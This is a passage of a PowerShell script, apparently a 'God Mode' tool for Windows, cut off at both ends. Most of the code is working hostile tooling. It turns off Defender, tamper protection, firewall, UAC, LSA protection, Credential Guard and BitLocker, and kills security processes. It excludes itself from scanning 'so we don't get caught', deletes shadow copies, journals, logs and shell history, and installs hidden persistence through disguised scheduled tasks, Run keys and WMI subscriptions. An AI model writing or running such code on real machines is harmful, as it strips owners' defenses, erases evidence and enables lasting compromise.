    try {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPLBoot" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "LSA protection (RunAsPPL) disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable LSA protection: $_" -Type "WARN" -Color Yellow }
}

function Disable-BitLocker {
    try {
        if (Get-Command Get-BitLockerVolume -ErrorAction SilentlyContinue) {
            $Volumes = Get-BitLockerVolume -ErrorAction SilentlyContinue | Where-Object { $_.ProtectionStatus -eq 'On' }
            foreach ($Vol in $Volumes) {
                Suspend-BitLocker -MountPoint $Vol.MountPoint -RebootCount 0 -ErrorAction SilentlyContinue
                Write-Log -Message "BitLocker suspended on $($Vol.MountPoint)." -Type "INFO" -Color Gray
            }
        } else {
            Write-Log -Message "Get-BitLockerVolume not available; BitLocker suspension skipped." -Type "WARN" -Color Yellow
        }
    } catch { Write-Log -Message "Failed to suspend BitLocker: $_" -Type "WARN" -Color Yellow }
}

function Disable-ASR {
    try {
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -AttackSurfaceReductionRules_Actions @{} -ErrorAction SilentlyContinue
            Set-MpPreference -AttackSurfaceReductionOnlyExclusions @() -ErrorAction SilentlyContinue
            Write-Log -Message "Attack Surface Reduction (ASR) rules disabled." -Type "INFO" -Color Gray
        } else {
            Write-Log -Message "Set-MpPreference not available; ASR disable skipped." -Type "WARN" -Color Yellow
        }
    } catch { Write-Log -Message "Failed to disable ASR: $_" -Type "WARN" -Color Yellow }
}

function Disable-ControlledFolderAccess {
    try {
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -EnableControlledFolderAccess Disabled -ErrorAction SilentlyContinue
            Write-Log -Message "Controlled Folder Access disabled." -Type "INFO" -Color Gray
        } else {
            Write-Log -Message "Set-MpPreference not available; Controlled Folder Access disable skipped." -Type "WARN" -Color Yellow
        }
    } catch { Write-Log -Message "Failed to disable Controlled Folder Access: $_" -Type "WARN" -Color Yellow }
}

function Disable-ExploitGuard {
    try {
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -EnableNetworkProtection AuditMode -ErrorAction SilentlyContinue
        } else {
            Write-Log -Message "Set-MpPreference not available; Exploit Guard network protection disable skipped." -Type "WARN" -Color Yellow
        }
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Network Protection" -Name "EnableNetworkProtection" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Exploit Guard / Network Protection disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to disable Exploit Guard: $_" -Type "WARN" -Color Yellow }
}

function Clear-ShadowCopies {
    try {
        vssadmin delete shadows /all /quiet 2>$null | Out-Null
        Write-Log -Message "Volume Shadow Copies cleared." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to clear shadow copies: $_" -Type "WARN" -Color Yellow }
}

function Clear-USNJournal {
    try {
        $Drives = Get-Volume -ErrorAction SilentlyContinue | Where-Object { $_.DriveLetter } | Select-Object -ExpandProperty DriveLetter
        foreach ($D in $Drives) {
            fsutil usn deletejournal /d "${D}:" 2>$null | Out-Null
        }
        Write-Log -Message "USN journals cleared on active drives." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to clear USN journal: $_" -Type "WARN" -Color Yellow }
}

function Clear-CrashDumps {
    try {
        Remove-Item -Path "C:\Windows\Minidump\*" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "C:\Windows\Memory.dmp" -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:LOCALAPPDATA\CrashDumps\*" -Recurse -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Crash dumps cleared." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to clear crash dumps: $_" -Type "WARN" -Color Yellow }
}

function Clear-PowerShellHistory {
    try {
        $HistoryPath = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath
        if ($HistoryPath -and (Test-Path $HistoryPath)) {
            Clear-Content -Path $HistoryPath -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $HistoryPath -Force -ErrorAction SilentlyContinue
        }
        # Also clear the older PS5 history path
        $OldHistory = Join-Path $env:APPDATA "Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
        if (Test-Path $OldHistory) {
            Clear-Content -Path $OldHistory -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $OldHistory -Force -ErrorAction SilentlyContinue
        }
        Write-Log -Message "PowerShell history cleared." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to clear PowerShell history: $_" -Type "WARN" -Color Yellow }
}

function Clear-RecentTraces {
    try {
        Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\thumbcache_*.db" -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Recent files, Jump Lists, and thumbnail caches cleared." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to clear recent traces: $_" -Type "WARN" -Color Yellow }
}

function Invoke-StealthMode {
    Write-DebugLog -FunctionName "Invoke-StealthMode" -Action "ENTRY"
    try {
        # Hide window title from casual inspection
        $Host.UI.RawUI.WindowTitle = "Windows PowerShell (x86)"
        # MainWindowTitle is read-only on some processes; skip direct assignment to avoid runtime error
        
        # Suppress script-block logging and transcription via registry (if not already hardened)
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Stealth mode applied: window title masked, PowerShell logging suppressed." -Type "INFO" -Color Gray
        Write-DebugLog -FunctionName "Invoke-StealthMode" -Action "EXIT" -Message "Success"
    } catch {
        Write-DebugLog -FunctionName "Invoke-StealthMode" -Action "ERROR" -Message "Partial failure" -ErrorRecord $_
        Write-Log -Message "Stealth mode partial failure: $_" -Type "WARN" -Color Yellow
    }
}

function Register-DeepPersistence {
    Write-DebugLog -FunctionName "Register-DeepPersistence" -Action "ENTRY"
    try {
        # Extra registry Run keys (both HKLM and WOW6432Node)
        $ScriptCmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
        Set-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -Value $ScriptCmd -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -Value $ScriptCmd -Force -ErrorAction SilentlyContinue
        
        # Additional scheduled tasks with different names
        $ExtraPrefixes = @("WindowsDefenderSigUpdates_", "OneDriveStandaloneUpdater_", "EdgeWebView2Updater_")
        foreach ($Prefix in $ExtraPrefixes) {
            # Skip if any task with this prefix already exists (idempotent)
            if (Get-ScheduledTask -TaskName "$Prefix*" -ErrorAction SilentlyContinue) {
                Write-Log -Message "Deep persistence task prefix $Prefix already exists; skipping." -Type "INFO" -Color Gray
                continue
            }
            $taskName = $Prefix + (Get-Random -Minimum 10000 -Maximum 99999)
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
            $trigger = New-ScheduledTaskTrigger -AtStartup
            $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue | Out-Null
            Write-Log -Message "Deep persistence task $taskName registered." -Type "INFO" -Color Gray
        }
        
        # WMI boot-level persistence (low-frequency service-modification trigger).
        # NOTE: Win32_ProcessStartupTrace was used previously but fires on EVERY
        # process start, spawning hundreds of -ToggleOn PowerShell processes and
        # constantly killing the Start-Monitoring loop via Register-StealthTask.
        # Switched to a 300-second service-modification poll which is sufficient
        # as a periodic re-trigger without causing monitoring-loop flapping.
        $WmiName = "Win32BootHealthCheck"
        $FilterPath = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
            Name = $WmiName
            EventNamespace = "root\cimv2"
            QueryLanguage = "WQL"
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_Service'"
        } -ErrorAction SilentlyContinue
        $ConsumerPath = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
            Name = $WmiName
            CommandLineTemplate = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
        } -ErrorAction SilentlyContinue
        if ($FilterPath -and $ConsumerPath) {
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter = $FilterPath; Consumer = $ConsumerPath} -ErrorAction SilentlyContinue | Out-Null
        }
        
        Write-Log -Message "Deep persistence registered: extra registry keys, backup tasks, and boot-level WMI." -Type "INFO" -Color Gray
        Write-DebugLog -FunctionName "Register-DeepPersistence" -Action "EXIT" -Message "Success"
    } catch {
        Write-DebugLog -FunctionName "Register-DeepPersistence" -Action "ERROR" -Message "Registration failed" -ErrorRecord $_
        Write-Log -Message "Deep persistence registration failed: $_" -Type "WARN" -Color Yellow
    }
}

function Export-GodModeLogs {
    param([string]$DestinationFolder = [Environment]::GetFolderPath("Desktop"))
    Write-DebugLog -FunctionName "Export-GodModeLogs" -Action "ENTRY" -Message "DestinationFolder=$DestinationFolder"
    try {
        $TimeStamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
        $FileName = "GodMode_Dump_$TimeStamp.log"
        $DestPath = Join-Path -Path $DestinationFolder -ChildPath $FileName

        $LogContent = @()
        $Header = @("===== ENTERPRISE DNS LOCKOUT / GOD MODE LOG DUMP =====", "Generated: $(Get-Date)", "Script: $PSCommandPath", "PSVersion: $($PSVersionTable.PSVersion)", "User: $([Environment]::UserName)", "Machine: $([Environment]::MachineName)", "===== MAIN LOG =====")
        $LogContent += $Header -join "`r`n"
        if (Test-Path $LogFile) { $LogContent += Get-Content -Raw -Path $LogFile -ErrorAction SilentlyContinue } else { $LogContent += "[No main log found]" }
        $LogContent += "`r`n===== DEBUG LOG ====="
        if (Test-Path $DebugLogFile) { $LogContent += Get-Content -Raw -Path $DebugLogFile -ErrorAction SilentlyContinue } else { $LogContent += "[No debug log found]" }
        if (Test-Path $GodModeLogFile) { $LogContent += "`r`n===== GOD MODE LOG ====="; $LogContent += Get-Content -Raw -Path $GodModeLogFile -ErrorAction SilentlyContinue }

        # Error summary from debug log
        $ErrorCount = 0
        if (Test-Path $DebugLogFile) {
            $ErrorCount = (Select-String -Path $DebugLogFile -Pattern "\[ERROR\]" -ErrorAction SilentlyContinue | Measure-Object).Count
        }
        $LogContent += "`r`n===== ERROR SUMMARY =====`r`nTotal ERROR entries in debug log: $ErrorCount`r`nDump complete.`r`n"

        if (($LogContent | Measure-Object).Count -eq 0) {
            Write-Host "[WARN] No logs found to dump." -ForegroundColor Yellow
            Write-DebugLog -FunctionName "Export-GodModeLogs" -Action "EXIT" -Message "No logs found"
            return
        }

        $LogContent -join "`r`n" | Out-File -FilePath $DestPath -Encoding UTF8 -Force
        Write-Host "[SUCCESS] Logs dumped to: $DestPath ($ErrorCount error entries captured)" -ForegroundColor Green
        Write-DebugLog -FunctionName "Export-GodModeLogs" -Action "EXIT" -Message "Success: $DestPath, ErrorCount=$ErrorCount"
    } catch {
        Write-DebugLog -FunctionName "Export-GodModeLogs" -Action "ERROR" -Message "Failed to dump logs" -ErrorRecord $_
        Write-Host "[ERROR] Failed to dump logs: $_" -ForegroundColor Red
    }
}

function Enable-DangerousMode {
    Write-DebugLog -FunctionName "Enable-DangerousMode" -Action "ENTRY"
    Write-Log -Message "Enabling dangerous mode..." -Type "WARN" -Color Yellow

    # 0. Add self to Defender exclusions BEFORE disabling it (so we don't get caught)
    Add-DefenderExclusion -Path $GodModeInstallDir
    Add-DefenderExclusion -Path $PSCommandPath

    # 1. Disable Tamper Protection (registry method, requires reboot on modern builds)
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Tamper Protection and Real-Time registry overrides applied." -Type "INFO" -Color Gray
    } catch {
        Write-Log -Message "Could not fully disable tamper protection via registry: $_" -Type "WARN" -Color Yellow
    }

    # 2. Disable core Windows Defender user-mode services only (boot-critical drivers excluded)
    $DefenderServices = @("WinDefend", "WdNisSvc", "wscsvc", "SecurityHealthService", "Sense", "MDCoreSvc", "WaaSMedicSvc", "usosvc", "WerSvc", "DPS", "BITS", "NisSrv", "SgrmBroker")
    foreach ($svc in $DefenderServices) {
        try {
            Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
            Write-Log -Message "Service $svc disabled and stopped." -Type "INFO" -Color Gray
        } catch { Write-Log -Message "Service $svc already down or inaccessible: $_" -Type "WARN" -Color Yellow }
    }

    # 3. Disable MpPreference settings (requires tamper protection off)
    try {
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
            Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
            Write-Log -Message "Windows Defender MpPreference settings disabled." -Type "INFO" -Color Gray
        } else {
            Write-Log -Message "Set-MpPreference not available; MpPreference disable skipped." -Type "WARN" -Color Yellow
        }
    } catch {
        Write-Log -Message "Error setting MpPreference: $_" -Type "WARN" -Color Yellow
    }

    # 4. Disable Firewall and SmartScreen
    try {
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled "False" -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Firewall disabled, SmartScreen disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Error disabling firewall/smartscreen: $_" -Type "WARN" -Color Yellow }

    # 4a. Disable Safe Mode and Recovery to prevent removal
    Disable-RecoveryAndSafeMode

    # 4b. Suppress Security Center alerts
    Disable-SecurityAlerts

    # 5. Disable UAC / Admin Consent
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0 -Force
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0 -Force
        Write-Log -Message "UAC and Admin Consent prompts disabled." -Type "INFO" -Color Gray
    } catch {
        Write-Log -Message "Direct UAC disable failed: $_. Trying SYSTEM fallback..." -Type "WARN" -Color Yellow
        $UacFallback = "reg add `"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`" /v EnableLUA /t REG_DWORD /d 0 /f & reg add `"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f"
        $UacResult = Invoke-AsSystem -Command $UacFallback
        if ($UacResult.Success) {
            Write-Log -Message "UAC disabled via SYSTEM fallback." -Type "INFO" -Color Gray
        } else {
            Write-Log -Message "SYSTEM fallback for UAC disable failed: $($UacResult.Output)" -Type "WARN" -Color Yellow
        }
    }

    # 6. Block Windows Update from re-enabling Defender
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoUpdate" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-Service -Name "wuauserv" -StartupType Disabled -ErrorAction SilentlyContinue
        Stop-Service -Name "wuauserv" -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Windows Update service disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Error disabling Windows Update: $_" -Type "WARN" -Color Yellow }

    # 7. Kill Defender processes
    try {
        Get-Process -Name MsMpEng, MsMpEngCP, smartscreen, SecurityHealthService, MpCmdRun, MsSense, MpDefenderCoreService, NisSrv, SgrmBroker, WerFault, WerFaultSecure, WaaSMedic, SecurityHealthSystray -ErrorAction SilentlyContinue |
            Stop-Process -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Defender processes terminated." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Error killing defender processes: $_" -Type "WARN" -Color Yellow }

    # 8. Disable event logging and clear tracks
    Disable-SecurityAuditing

    # 9. NEW: Disable UAC prompts (silent elevation)
    Disable-UACPrompts

    # 10. NEW: Disable SmartScreen via registry
    Disable-SmartScreenRegistry

    # 11. NEW: Disable Remote UAC (full admin tokens over network)
    Disable-RemoteUAC

    # 12. NEW: Disable Credential Guard / VBS
    Disable-CredentialGuard

    # 13. NEW: Disable Windows Script Host
    Disable-WindowsScriptHost

    # 14. NEW: Broader security subsystem disable
    Disable-AppLocker
    Disable-WindowsSandbox
    Disable-LSAProtection
    Disable-ASR
    Disable-ControlledFolderAccess
    Disable-ExploitGuard
    Disable-BitLocker

    # Harden God Mode registry keys to prevent tampering
    Write-Log -Message "Hardening God Mode registry keys against tampering..." -Type "INFO" -Color Yellow
    $GodModeRegistryKeys = @(
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
        "SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
        "SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications",
        "SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU",
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer",
        "SOFTWARE\Policies\Microsoft\Windows\System",
        "SOFTWARE\Microsoft\Windows Script Host\Settings",
        "SOFTWARE\Microsoft\Windows Defender\Features"
    )
    foreach ($Key in $GodModeRegistryKeys) {
        $null = Harden-RegistryKey -Path $Key
    }
    Write-DebugLog -FunctionName "Enable-DangerousMode" -Action "EXIT" -Message "Complete"
}

function Disable-DangerousMode {
    Write-DebugLog -FunctionName "Disable-DangerousMode" -Action "ENTRY"
    Write-Log -Message "Disabling dangerous mode..." -Type "WARN" -Color Yellow

    # Restore God Mode registry ACLs before attempting to remove values
    Write-Log -Message "Restoring God Mode registry ACLs..." -Type "INFO" -Color Yellow
    $GodModeRegistryKeys = @(
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
        "SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
        "SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications",
        "SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU",
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer",
        "SOFTWARE\Policies\Microsoft\Windows\System",
        "SOFTWARE\Microsoft\Windows Script Host\Settings",
        "SOFTWARE\Microsoft\Windows Defender\Features"
    )
    foreach ($Key in $GodModeRegistryKeys) {
        $null = Restore-RegistryKey -Path $Key
    }

    # 1. Restore Tamper Protection registry
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Error restoring tamper protection registry: $_" -Type "WARN" -Color Yellow }

    # 2. Restore Defender services
    $DefenderServices = @("WinDefend", "WdNisSvc", "wscsvc", "SecurityHealthService", "Sense", "MDCoreSvc", "WaaSMedicSvc", "usosvc", "WerSvc", "DPS", "BITS", "NisSrv", "SgrmBroker")
    foreach ($svc in $DefenderServices) {
        try {
            Set-Service -Name $svc -StartupType Automatic -ErrorAction SilentlyContinue
            Start-Service -Name $svc -ErrorAction SilentlyContinue
        } catch { Write-Log -Message "Could not restore service $svc`: $_" -Type "WARN" -Color Yellow }
    }

    # 3. Restore MpPreference
    try {
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
            Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
            Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue
            Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue
            Set-MpPreference -DisablePrivacyMode $false -ErrorAction SilentlyContinue
            Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $false -ErrorAction SilentlyContinue
            Set-MpPreference -DisableArchiveScanning $false -ErrorAction SilentlyContinue
            Set-MpPreference -DisableIntrusionPreventionSystem $false -ErrorAction SilentlyContinue
        } else {
            Write-Log -Message "Set-MpPreference not available; MpPreference restore skipped." -Type "WARN" -Color Yellow
        }
    } catch { Write-Log -Message "Error restoring MpPreference: $_" -Type "WARN" -Color Yellow }

    # 4. Restore Firewall and SmartScreen
    try {
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled "True" -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "On" -Force -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Error restoring firewall/smartscreen: $_" -Type "WARN" -Color Yellow }

    # 5. Restore UAC
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 1 -Force
    } catch { Write-Log -Message "Error restoring UAC: $_" -Type "WARN" -Color Yellow }

    # 6. Restore Windows Update
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoUpdate" -ErrorAction SilentlyContinue
        Set-Service -Name "wuauserv" -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service -Name "wuauserv" -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Error restoring Windows Update: $_" -Type "WARN" -Color Yellow }

    # 7. Restart WinDefend
    try { Start-Service -Name WinDefend -ErrorAction SilentlyContinue } catch { Write-Log -Message "Could not restart WinDefend: $_" -Type "WARN" -Color Yellow }

    # 8. Restore Safe Mode and Recovery
    # BCD/WinRE modifications removed to prevent boot-level conflicts in VirtualBox
    Write-Log -Message "BCD/WinRE restore skipped (boot-safe mode)." -Type "INFO" -Color Gray

    # 9. Restore Security Center alerts
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "HideSCAHealth" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -ErrorAction SilentlyContinue
    } catch {}

    # 10. Restore ELAM
    try {
        Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\EarlyLaunch" -Name "DriverLoadPolicy" -ErrorAction SilentlyContinue
    } catch {}

    # 11. Restore event logging
    try {
        Set-Service -Name "EventLog" -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service -Name "EventLog" -ErrorAction SilentlyContinue
    } catch {}

    # 12. NEW: Restore UAC prompts
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 5 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 1 -Force -ErrorAction SilentlyContinue
    } catch {}

    # 13. NEW: Restore SmartScreen
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter" -Name "EnabledV9" -ErrorAction SilentlyContinue
    } catch {}

    # 14. NEW: Restore Remote UAC
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -ErrorAction SilentlyContinue
    } catch {}

    # 15. NEW: Restore Credential Guard / VBS
    try {
        Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "RequirePlatformSecurityFeatures" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LsaCfgFlags" -ErrorAction SilentlyContinue
    } catch {}

    # 16. NEW: Restore Windows Script Host
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Script Host\Settings" -Name "Enabled" -ErrorAction SilentlyContinue
    } catch {}

    Write-Log -Message "Dangerous mode disable attempt complete. Reboot strongly recommended for full restoration." -Type "INFO" -Color Yellow
    Write-DebugLog -FunctionName "Disable-DangerousMode" -Action "EXIT" -Message "Complete"
}

function Register-StealthTask {
    # Don't kill an already-running monitoring loop.
    # Multiple -ToggleOn persistence layers fire at startup and would otherwise
    # unregister each other's stealth task, causing Start-Monitoring to flap and
    # never stabilize (post-reboot elevation bug).
    $RunningStealth = Get-ScheduledTask -TaskName "$GodModeTaskPrefix*" -ErrorAction SilentlyContinue |
        Where-Object { $_.State -eq 'Running' }
    if ($RunningStealth) {
        Write-Log -Message "Stealth monitoring task already running ($($RunningStealth.TaskName)). Skipping re-registration to prevent flapping." -Type "INFO" -Color Gray
        return
    }

    $taskName = $GodModeTaskPrefix + (Get-Random -Minimum 10000 -Maximum 99999)
    Unregister-StealthTask

    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -Launch"

    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" `
        -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
        -Principal $principal -Force | Out-Null

    # Start the task immediately so monitoring begins now
    try {
        Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    } catch {}
}

function Unregister-StealthTask {
    Get-ScheduledTask -TaskName "$GodModeTaskPrefix*" -ErrorAction SilentlyContinue |
        Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
}

function Elevate-Process {
    param(
        [string]$Path,
        [string]$Arguments = ""
    )
